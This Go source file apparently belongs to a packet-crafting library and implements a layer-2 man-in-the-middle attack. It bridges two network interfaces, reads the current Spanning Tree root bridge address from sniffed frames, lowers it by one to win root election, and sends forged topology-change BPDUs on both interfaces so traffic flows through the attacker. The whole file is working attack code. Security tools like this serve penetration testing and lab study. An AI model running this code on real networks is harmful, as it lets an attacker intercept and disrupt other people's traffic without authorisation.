package higherlevel

import (
	"fmt"
	"github.com/tiagomdiogo/GoPpy/packet"
	"github.com/tiagomdiogo/GoPpy/sniffer"
	"github.com/tiagomdiogo/GoPpy/supersocket"
	"github.com/tiagomdiogo/GoPpy/utils"
	"log"
	"strconv"
	"strings"
	"time"
)

func StpRootBridgeMitM2(iface1, iface2 string) {

	ss, err := supersocket.NewSuperSocket(iface1, "")
	if err != nil {
		log.Fatal(err)
	}
	go sniffer.Bridge_and_Sniff(iface1, iface2)
	for {
		pkt, err := ss.Recv()
		if err != nil {
			log.Fatal(err)
		}

		stpLayer := utils.GetSTPLayer(pkt)
		if stpLayer != nil {
			fmt.Println("Received an STP packet")
		}

		rootString := stpLayer.RouteID.HwAddr.String()
		rootStringAux := strings.ReplaceAll(rootString, ":", "")
		rootInt, err := strconv.ParseInt(rootStringAux, 16, 64)
		if err != nil {
			log.Fatal(err)
		}
		rootInt -= 1

		rootMacHex := fmt.Sprintf("%012x", rootInt)
		parts := make([]string, 0, 6)
		for i := 0; i < len(rootMacHex); i += 2 {
			parts = append(parts, rootMacHex[i:i+2])
		}
		rootMac := strings.Join(parts, ":")

		params := map[string]interface{}{
			"rootmac":   rootMac,
			"bridgemac": rootMac,
			"rootid":    stpLayer.RouteID.SysID,
			"bridgeid":  stpLayer.RouteID.SysID,
		}

		stpRootBridgeHijacktwo(iface1, params)
		stpRootBridgeHijacktwo(iface2, params)
		time.Sleep(10 * time.Second)
	}
}

func stpRootBridgeHijacktwo(iface string, params map[string]interface{}) {

	ss, err := supersocket.NewSuperSocket(iface, "")
	if err != nil {
		log.Fatal(err)
	}

	rootID := params["rootid"].(uint16)
	bridgeID := params["bridgeid"].(uint16)
	bridgeMAC := params["bridgemac"].(string)
	rootMAC := params["rootmac"].(string)

	Dot3Layer := packet.Dot3Layer()
	Dot3Layer.SetDstMAC("01:80:c2:00:00:00")
	Dot3Layer.SetSrcMAC(bridgeMAC)

	LLCLayer := packet.LLCLayer()

	stpLayer := packet.STPLayer()
	stpLayer.Layer().TC = true
	stpLayer.Layer().PortID = 0x8002
	stpLayer.SetRootBridgeMacStr(rootMAC)
	stpLayer.SetRootBridgeID(rootID)
	stpLayer.SetBridgeMacStr(bridgeMAC)
	stpLayer.SetBridgeID(bridgeID)

	pkt, err := packet.CraftPacket(Dot3Layer.Layer(), LLCLayer.Layer(), stpLayer.Layer())

	ss.Send(pkt)

	for {
		pkt, err := ss.Recv()
		if err != nil {
			log.Fatal(err)
		}

		// Parse the packet
		stpResponse := utils.GetSTPLayer(pkt)

		if stpResponse != nil {
			Dot3Layer := packet.Dot3Layer()
			Dot3Layer.SetDstMAC("01:80:c2:00:00:00")
			Dot3Layer.SetSrcMAC(bridgeMAC)

			LLCLayer := packet.LLCLayer()

			stpLayer := packet.STPLayer()
			stpLayer.Layer().TCA = true
			stpLayer.Layer().PortID = 0x8002
			stpLayer.SetRootBridgeMacStr(rootMAC)
			stpLayer.SetRootBridgeID(rootID)
			stpLayer.SetBridgeMacStr(bridgeMAC)
			stpLayer.SetBridgeID(bridgeID)

			finalAck, err := packet.CraftPacket(Dot3Layer.Layer(), LLCLayer.Layer(), stpLayer.Layer())
			if err != nil {
				log.Fatal(err)
			}
			ss.Send(finalAck)
			fmt.Println("Sent the topology acknowledge")
			return
		}
	}
}
